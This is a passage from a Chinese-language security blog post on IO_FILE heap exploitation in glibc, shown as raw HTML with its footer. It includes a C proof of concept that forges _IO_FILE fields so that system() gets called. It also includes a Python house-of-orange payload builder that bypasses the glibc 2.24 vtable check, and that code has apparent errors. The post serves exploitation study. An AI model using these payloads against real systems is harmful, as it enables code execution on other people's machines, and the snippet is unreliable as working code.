; <span class="comment">//_IO_write_ptr</span></span><br><span class="line">    top[<span class="number">20</span>] = (<span class="keyword">size_t</span>) &amp;top[<span class="number">18</span>];</span><br><span class="line">    top[<span class="number">21</span>] = <span class="number">2</span>;</span><br><span class="line">    top[<span class="number">22</span>] = <span class="number">3</span>;</span><br><span class="line">    top[<span class="number">24</span>] = <span class="number">-1</span>;</span><br><span class="line">    top[<span class="number">27</span>] = (<span class="keyword">size_t</span>) <span class="built_in">stdin</span> - <span class="number">0x33f0</span> - <span class="number">0x18</span>;</span><br><span class="line">    top[<span class="number">29</span>] = (<span class="keyword">size_t</span>) &amp;winner;</span><br><span class="line">  	top[<span class="number">30</span>] = (<span class="keyword">size_t</span>) &amp;top[<span class="number">30</span>];</span><br><span class="line">  </span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">10</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">winner</span><span class="params">(<span class="keyword">char</span> *ptr)</span></span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">    system(ptr);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>关键payload 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">VtableCheckBypass_2</span>(<span class="params">vtable_addr,heap_addr,system_addr,binsh_addr,io_list_all_addr</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    _IO_str_finish conditions</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    houseoforange glibc.2.24 bypass vtablecheck</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    vtable_addr is _IO_str_finish addr (libc 2.24: 0x3BE050)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    payload += p64((binsh_addr+<span class="number">0x10</span>) &amp; ~<span class="number">1</span>) + p64(<span class="number">0x61</span>)</span><br><span class="line">    payload += p64(<span class="number">0</span>) + p64(io_list_all_addr-<span class="number">0x10</span>)</span><br><span class="line">    payload += p64(<span class="number">0</span>) + p64(<span class="number">1</span>)</span><br><span class="line">    payload += p64(<span class="number">0</span>) + p64(binsh_addr)</span><br><span class="line">    payload += p64(<span class="number">0</span>) * <span class="number">12</span></span><br><span class="line">    payload += p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line">    payload += p64(<span class="number">0</span>) * <span class="number">2</span></span><br><span class="line">    payload += p64(vtable_addr-<span class="number">0x18</span>)</span><br><span class="line">    payload = payload.ljust(<span class="number">0xe8</span>,<span class="string">&#x27;\x00&#x27;</span>) + p64(system_addr)</span><br><span class="line">    payload += p64(payload+<span class="number">0x660</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> payload</span><br></pre></td></tr></table></figure>



<h2 id="0x04-缓冲区以及fileno的利用"><a href="#0x04-缓冲区以及fileno的利用" class="headerlink" title="0x04 缓冲区以及fileno的利用"></a>0x04 缓冲区以及<code>fileno</code>的利用</h2><p>在 0x03 提到了<code> _IO_FILE</code> 结构体上</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line">  <span class="keyword">int</span> _flags;       <span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_ptr;   <span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_end;   <span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_base;  <span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_base; <span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_ptr;  <span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_end;  <span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_base;   <span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_end;    <span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> _fileno;</span><br><span class="line">  <span class="keyword">int</span> _flags2;</span><br><span class="line">  _IO_off_t _old_offset; <span class="comment">/* This used to be _offset but it&#x27;s too small.  */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<p>因为进程中包含了系统默认的三个文件流 stdin\stdout\stderr，因此这种方式可以不需要进程中存在文件操作，通过 scanf\printf 一样可以进行利用。</p>
</div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {
        var options = {
            selector: '.gallery-item'
        };
        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);
        }</script>
  </div>
</article>

    <div class="blog-post-comments">
        <div id="disqus_thread">
            <noscript>Please enable JavaScript to view the comments.</noscript>
        </div>
    </div>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Articles</a></li>
         
          <li><a href="/search">Search</a></li>
         
          <li><a href="/atom.xml">RSS</a></li>
         
          <li><a href="/categories/">Categories</a></li>
         
          <li><a href="/link">Links</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90"><span class="toc-number">1.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8"><span class="toc-number">2.</span> <span class="toc-text">利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exploit"><span class="toc-number">3.</span> <span class="toc-text">exploit</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-houseoforange"><span class="toc-number"></span> <span class="toc-text">0x02 houseoforange</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90-1"><span class="toc-number">2.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-1"><span class="toc-number">3.</span> <span class="toc-text">利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#overwrite-the-top-chunk"><span class="toc-number">3.1.</span> <span class="toc-text">overwrite the top chunk</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#trigger-int-free"><span class="toc-number">3.2.</span> <span class="toc-text">trigger _int_free()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#build-a-large-chunk-and-info-leak"><span class="toc-number">3.3.</span> <span class="toc-text">build a large chunk and info leak</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#File-Stream-Oriented-Programming%EF%BC%88FSOP%EF%BC%89"><span class="toc-number">3.4.</span> <span class="toc-text">File Stream Oriented Programming（FSOP）</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exploit-1"><span class="toc-number">4.</span> <span class="toc-text">exploit</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-houseoforange-glibc-2-24-bypass"><span class="toc-number"></span> <span class="toc-text">0x03 houseoforange (glibc 2.24 bypass)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#IO-str-jumps-gt-overflow"><span class="toc-number">1.</span> <span class="toc-text">_IO_str_jumps -&gt; overflow</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#IO-str-jumps-gt-finish"><span class="toc-number">2.</span> <span class="toc-text">_IO_str_jumps -&gt; finish</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B"><span class="toc-number">2.1.</span> <span class="toc-text">示例</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-%E7%BC%93%E5%86%B2%E5%8C%BA%E4%BB%A5%E5%8F%8Afileno%E7%9A%84%E5%88%A9%E7%94%A8"><span class="toc-number"></span> <span class="toc-text">0x04 缓冲区以及fileno的利用</span></a>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://bestwing.me/IO_FILE_Pwn.html"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=https://bestwing.me/IO_FILE_Pwn.html&text=IO_FILE Pwn 利用整理"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://bestwing.me/IO_FILE_Pwn.html&title=IO_FILE Pwn 利用整理"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://bestwing.me/IO_FILE_Pwn.html&is_video=false&description=IO_FILE Pwn 利用整理"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=IO_FILE Pwn 利用整理&body=Check out this article: https://bestwing.me/IO_FILE_Pwn.html"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=https://bestwing.me/IO_FILE_Pwn.html&title=IO_FILE Pwn 利用整理"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=https://bestwing.me/IO_FILE_Pwn.html&title=IO_FILE Pwn 利用整理"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://bestwing.me/IO_FILE_Pwn.html&title=IO_FILE Pwn 利用整理"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=https://bestwing.me/IO_FILE_Pwn.html&title=IO_FILE Pwn 利用整理"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://bestwing.me/IO_FILE_Pwn.html&name=IO_FILE Pwn 利用整理&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://bestwing.me/IO_FILE_Pwn.html&t=IO_FILE Pwn 利用整理"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2016-2024
    Swing
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Articles</a></li>
         
          <li><a href="/search">Search</a></li>
         
          <li><a href="/atom.xml">RSS</a></li>
         
          <li><a href="/categories/">Categories</a></li>
         
          <li><a href="/link">Links</a></li>
        
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->

<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">


<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">


    <!-- jquery -->

<script src="/lib/jquery/jquery.min.js"></script>


<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>

<!-- clipboard -->

  
<script src="/lib/clipboard/clipboard.min.js"></script>

  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="far fa-clone"></i>';
    btn += '</span>'; 
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Google Analytics -->

    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-133464311-1"></script>
    <script>
        window.dataLayer = window.dataLayer || [];
        function gtag(){dataLayer.push(arguments);}
        gtag('js', new Date());
        gtag('config', 'UA-133464311-1');
    </script>

<!-- Baidu Analytics -->

  <script type="text/javascript">
        var _hmt = _hmt || [];
        (function() {
          var hm = document.createElement("script");
          hm.src = "https://hm.baidu.com/hm.js?2e6da3c375c8a87f5b664cea6d4cb29c";
          var s = document.getElementsByTagName("script")[0];
          s.parentNode.insertBefore(hm, s);
        })();
        </script>

<!-- Umami Analytics -->

<!-- Disqus Comments -->

    <script type="text/javascript">
        var disqus_shortname = 'swing';

        (function(){
            var dsq = document.createElement('script');
            dsq.type = 'text/javascript';
            dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        }());
    </script>


</body>
</html>
